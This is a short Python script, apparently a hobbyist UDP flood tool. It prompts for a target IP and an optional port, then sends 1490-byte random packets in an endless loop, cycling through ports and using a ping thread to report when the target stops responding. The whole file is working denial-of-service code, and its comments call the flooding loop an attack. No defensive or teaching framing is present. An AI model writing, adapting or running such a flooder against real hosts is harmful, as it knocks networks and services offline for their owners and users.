import os
import time
import random
import socket
import subprocess
import threading

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Function to check if the IP is reachable (runs in a separate thread)
def monitor_ip(ip):
    global ip_reachable
    while True:
        try:
            result = subprocess.run(["ping", "-c", "1", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            ip_reachable = "1 packets transmitted, 1 received" in result.stdout  # Works in Termux
        except Exception as e:
            print(f"Error checking IP reachability: {e}")
            ip_reachable = False

        time.sleep(0.1)  # Check every 100ms

# Get target IP address
ip = input("Enter target IP address: ")

# Port selection
port_mode = False  # If False, all ports will be used
port = 2

while True:
    port_bool = input("Use a specific port? [y/n]: ").strip().lower()

    if port_bool == "y":
        port_mode = True
        port = int(input("Enter port number: "))
        break
    elif port_bool == "n":
        break
    else:
        print("\033[91mInvalid choice! Try again.\033[0m")
        time.sleep(2)

# Start IP monitoring thread
ip_reachable = True
threading.Thread(target=monitor_ip, args=(ip,), daemon=True).start()

# Start attack
sent = 0
while True:
    if not ip_reachable:
        print(f"\033[31;1mWarning: Target {ip} is unreachable!\033[0m")

    try:
        if not port_mode:  # If all ports should be used
            if port == 65534:
                port = 1
            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print(f"\033[32;1mSent {sent} packets to {ip} through port: {port}\033[0m")

        else:  # If a specific port is used
            if port < 2:
                port = 2
            elif port == 65534:
                port = 2
            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"\033[32;1mSent {sent} packets to {ip} through port: {port}\033[0m")

    except Exception as e:
        print(f"\033[31;1mAn error occurred: {e}\033[0m")